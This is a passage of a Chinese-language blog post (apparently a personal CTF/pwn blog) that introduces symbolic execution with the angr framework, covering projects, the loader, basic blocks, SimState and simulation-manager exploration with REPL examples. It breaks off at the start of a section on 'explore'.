<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>符号执行与约束求解初探 | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="&#x3D;|&#x3D;">
<meta property="og:type" content="article">
<meta property="og:title" content="符号执行与约束求解初探">
<meta property="og:url" content="https://ixout.github.io/posts/20048/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="&#x3D;|&#x3D;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2cc667bb30dce44a47.jpg">
<meta property="article:published_time" content="2024-05-08T11:37:25.000Z">
<meta property="article:modified_time" content="2024-05-11T14:13:17.040Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="符号执行">
<meta property="article:tag" content="约束求解">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2cc667bb30dce44a47.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/20048/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '符号执行与约束求解初探',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-11 22:13:17'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">56</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2cc667bb30dce44a47.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">符号执行与约束求解初探</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-08T11:37:25.000Z" title="发表于 2024-05-08 19:37:25">2024-05-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-11T14:13:17.040Z" title="更新于 2024-05-11 22:13:17">2024-05-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">16.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>71分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-266757.htm">[原创]符号执行在自动化Pwn中的简单利用-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/CTF-All-In-One/doc-5.3_symbolic_execution.md">五、高级篇 - 5.3 符号执行 - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/jakespringer/angr_ctf">jakespringer/angr_ctf (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://myts2.cn/guan-yu-fasterde-na-xie-shi/">关于Faster的那些事… (myts2.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/675592367">符号执行 (Symbolic Execution) 与约束求解 (Constraint Solving) - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/myx-myx/articles/17009330.html">Z3求解器基础学习 （一） 从例子入门 - 说芬兰语的雪 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/reverse/tools/simulate-execution/unicorn/">Unicorn Engine - CTF Wiki (ctf-wiki.org)</a></p>
<p>这两个东西应该逆向中会用的比较多,不过也不排除出现在pwn中(自动化pwn),而且也可以使用在自动化漏洞挖掘中,先简单学习一下常用的几个工具</p>
<h1 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h1><p>什么是符号执行?</p>
<p>简单来说就是将输入符号化,然后找到所有程序可能的执行路径与这些符号的关系</p>
<h2 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h2><p><a target="_blank" rel="noopener" href="https://github.com/angr/angr">angr</a> 是一个多架构的二进制分析平台，具备对二进制文件的动态符号执行能力和多种静态分析能力。</p>
<p>官方文档<a target="_blank" rel="noopener" href="https://docs.angr.io/en/latest/">angr documentation</a></p>
<h3 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h3><p>使用angr 的第一步是新建一个工程，几乎所有的操作都是围绕这个工程展开的：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&#x27;./pwn&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>载入二进制文件后，我们就可以访问一些基本属性，如文件名、架构、入口地址：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.arch</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.entry</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.filename</span><br></pre></td></tr></table></figure>
<p>angr 中的 CLE 模块用于将二进制文件载入虚拟地址空间，而CLE 最主要的接口就是 loader 类。</p>
<p>可以通过 Project 的 <code>.loader</code>的属性查看</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.loader</span><br><span class="line">&lt;Loaded pwn, maps [<span class="number">0x400000</span>:<span class="number">0xa07fff</span>]&gt;</span><br></pre></td></tr></table></figure>
<p>通过 loader, 我们可以获得二进制文件的共享库、地址空间等信息。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.loader.shared_objects</span><br><span class="line">OrderedDict([(<span class="string">&#x27;pwn&#x27;</span>, &lt;ELF Object pwn, maps [<span class="number">0x400000</span>:<span class="number">0x40a65f</span>]&gt;), (<span class="string">&#x27;libc.so.6&#x27;</span>, &lt;ELF Object libc-<span class="number">2.31</span>.so, maps [<span class="number">0x500000</span>:<span class="number">0x6f165f</span>]&gt;), (<span class="string">&#x27;ld-linux-x86-64.so.2&#x27;</span>, &lt;ELF Object ld-<span class="number">2.31</span>.so, maps [<span class="number">0x700000</span>:<span class="number">0x72f18f</span>]&gt;), (<span class="string">&#x27;extern-address space&#x27;</span>, &lt;ExternObject Object cle<span class="comment">##externs, maps [0x800000:0x87ffff]&gt;), (&#x27;cle##tls&#x27;, &lt;ELFTLSObjectV2 Object cle##tls, maps [0x900000:0x91500f]&gt;)])</span></span><br></pre></td></tr></table></figure>
<p>但通常我们在创建工程时选择<strong>关闭</strong> <code>auto_load_libs</code> 以避免 angr 加载共享库：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = angr.Project(<span class="string">&#x27;/bin/true&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<h3 id="模拟执行"><a href="#模拟执行" class="headerlink" title="模拟执行"></a>模拟执行</h3><p><code>project.factory</code> 提供了很多类对二进制文件进行分析，它提供了几个方便的构造函数。</p>
<p><code>project.factory.block()</code> 用于从给定地址解析一个 basic block，对象类型为 Block,基本块是angr模拟执行的最小单位，一个基本块<strong>以遇到更改ip指令(比如说jmp,jz,jnz,call等等)为止</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry)    <span class="comment"># 从程序头开始解析一个 basic block</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>block</span><br><span class="line">&lt;Block <span class="keyword">for</span> <span class="number">0x401370</span>, <span class="number">42</span> <span class="built_in">bytes</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>block.pp()                  <span class="comment"># pretty-print of disassemble code of the block</span></span><br><span class="line"><span class="number">0x401370</span>:       xor     ebp, ebp</span><br><span class="line"><span class="number">0x401372</span>:       mov     r9, rdx</span><br><span class="line"><span class="number">0x401375</span>:       pop     rsi</span><br><span class="line"><span class="number">0x401376</span>:       mov     rdx, rsp</span><br><span class="line"><span class="number">0x401379</span>:       <span class="keyword">and</span>     rsp, <span class="number">0xfffffffffffffff0</span></span><br><span class="line"><span class="number">0x40137d</span>:       push    rax</span><br><span class="line"><span class="number">0x40137e</span>:       push    rsp</span><br><span class="line"><span class="number">0x40137f</span>:       lea     r8, qword ptr [rip + <span class="number">0x32da</span>]</span><br><span class="line"><span class="number">0x401386</span>:       lea     rcx, qword ptr [rip + <span class="number">0x3263</span>]</span><br><span class="line"><span class="number">0x40138d</span>:       lea     rdi, qword ptr [rip - <span class="number">0xe4</span>]</span><br><span class="line"><span class="number">0x401394</span>:       call    qword ptr [rip + <span class="number">0x205b76</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>block.instructions          <span class="comment"># 指令数量</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>block.instruction_addrs     <span class="comment"># 指令地址</span></span><br><span class="line">[<span class="number">4199280L</span>, <span class="number">4199282L</span>, <span class="number">4199285L</span>, <span class="number">4199286L</span>, <span class="number">4199289L</span>, <span class="number">4199293L</span>, <span class="number">4199294L</span>, <span class="number">4199295L</span>, <span class="number">4199302L</span>, <span class="number">4199309L</span>, <span class="number">4199316L</span>]</span><br></pre></td></tr></table></figure>
<p>另外，还可以将 Block 对象转换成其他形式：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>block.capstone&lt;CapstoneBlock <span class="keyword">for</span> <span class="number">0x401370</span>&gt;&gt;&gt;&gt; block.capstone.pp()&gt;&gt;&gt; block.vexIRSB &lt;<span class="number">0x2a</span> <span class="built_in">bytes</span>, <span class="number">11</span> ins., &lt;Arch AMD64 (LE)&gt;&gt; at <span class="number">0x401370</span>&gt;&gt;&gt; block.vex.pp()</span><br></pre></td></tr></table></figure>
<h4 id="SimState"><a href="#SimState" class="headerlink" title="SimState"></a>SimState</h4><p>angr 使用 <code>SimState</code> 类表示一个 模拟的程序状态 （simulated program state），我们的各种操作实际上是<u>由一个 state 步进到另一个 state 的过程</u>。</p>
<p>我们使用 <code>project.factory.entry_state()</code> 获取一个程序的初始执行状态，使用 <code>project.factory.blank_state(addr)</code> 获取一个程序从指定地址开始执行的空白状态：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = proj.factory.blank_state(<span class="number">0xdeadbeef</span>)</span><br></pre></td></tr></table></figure>
<p>该对象包含了程序的内存、寄存器、文件系统数据等等模拟运行时动态变化的数据，例如：</p>
<ul>
<li><code>state.regs</code>：寄存器状态组，其中每个寄存器都为一个 <em>位向量</em> （BitVector），我们可以通过寄存器名称来访问对应的寄存器（例如 <code>state.regs.esp -= 12</code> ）。</li>
<li><code>state.mem</code>：该状态的内存访问接口，我们可以直接通过 <code>state.mem[addr].type</code> 完成内存访问（例如 <code>state.mem[0x1000].long = 4</code> ，对于读而言还需指定 <code>.resolved</code> 或 <code>.concrete</code> 表示位向量或是实际值，例如 <code>state.mem[0x1000].long.concrete</code>）。</li>
<li><code>state.memory</code>：另一种形式的内存访问接口：</li>
<li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量。</li>
<li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址。</li>
<li><code>state.posix</code>：POSIX 相关的环境接口，例如 <code>state.posix.dumps(fileno)</code> 获取对应文件描述符上的流。</li>
</ul>
<h4 id="sigmr"><a href="#sigmr" class="headerlink" title="sigmr"></a>sigmr</h4><p>SIMULATION_MANAGER - 模拟执行器 </p>
<p>angr 将一个状态的执行方法独立成一个 <code>SimulationManager</code> 类，以下两种写法等效：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.factory.simgr(state)</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> active&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.factory.simulation_manager(state)</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> active&gt;</span><br></pre></td></tr></table></figure>
<p>比较重要的两个条件：</p>
<ul>
<li><code>simgr.step()</code>：<strong>以基本块为单位</strong>的单步执行。</li>
<li><code>simgr.explore()</code>：进行路径探索找到满足相应条件的状态。</li>
</ul>
<p><code>simgr.explore()</code> 的默认参数是 <code>find</code>，即<strong>期望条件</strong>，当模拟执行器在路径探索的过程中发现当前状态满足该条件时，该状态会被放到 <code>simgr.found</code> 列表中，若无法找到则该列表为空。</p>
<p>期望条件通常可以是执行到某个地址：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.explore(find=<span class="number">0x80492F0</span>) <span class="comment"># explore to a specific address</span></span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">825</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="keyword">is</span> accessing memory <span class="keyword">with</span> an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">825</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="keyword">with</span> this by generating an unconstrained symbolic variable <span class="keyword">and</span> continuing. You can resolve this by:</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="number">1</span>) setting a value to the initial state</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="number">0x7ffeff60</span> <span class="keyword">with</span> <span class="number">4</span> unconstrained <span class="built_in">bytes</span> referenced <span class="keyword">from</span> <span class="number">0x819af30</span> (strcmp+<span class="number">0x0</span> <span class="keyword">in</span> libc.so<span class="number">.6</span> (<span class="number">0x9af30</span>))</span><br><span class="line">WARNING  | <span class="number">2023</span>-07-<span class="number">17</span> 04:04:<span class="number">28</span>,<span class="number">826</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="number">0x7ffeff70</span> <span class="keyword">with</span> <span class="number">12</span> unconstrained <span class="built_in">bytes</span> referenced <span class="keyword">from</span> <span class="number">0x819af30</span> (strcmp+<span class="number">0x0</span> <span class="keyword">in</span> libc.so<span class="number">.6</span> (<span class="number">0x9af30</span>))</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> active, <span class="number">16</span> deadended, <span class="number">1</span> found&gt;</span><br></pre></td></tr></table></figure>
<p>期望条件也可以是自定义的以 <em>状态</em> 为参数的布尔函数。例如，若是我们想要寻找一条输出指定字符串的路径，可以选择通过判断该字符串是否在输出中的方式，我们可以通过 <code>state.posix.dumps(文件描述符)</code> 来获取对应文件描述符上的字符流：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">state</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">b&quot;Good&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>simgr.explore(find=foo)</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">17</span> deadended, <span class="number">1</span> found&gt;</span><br></pre></td></tr></table></figure>
<p>除了 <code>find</code> 参数外，我们也可以指定 <code>avoid</code> 参数——模拟器运行中应当要<strong>避开</strong>的条件，当一个状态符合这样的条件时，其会被放在 <code>.avoided</code> 列表中并不再往后执行。类似地，<code>avoid</code> 参数可以是某个地址，也可以是自定义的布尔函数。</p>
<p>此外，我们还可以通过指定 <code>num_find</code> 参数来指定需要寻找的符合条件的状态的数量，若未指定则会在 <code>.found</code> 列表中存储所有的符合条件的状态。</p>
<h4 id="explore"><a href="#explore" class="headerlink" title="explore"></a>explore</h4><p>explore是在ctf中使用的比较多的共能</p>
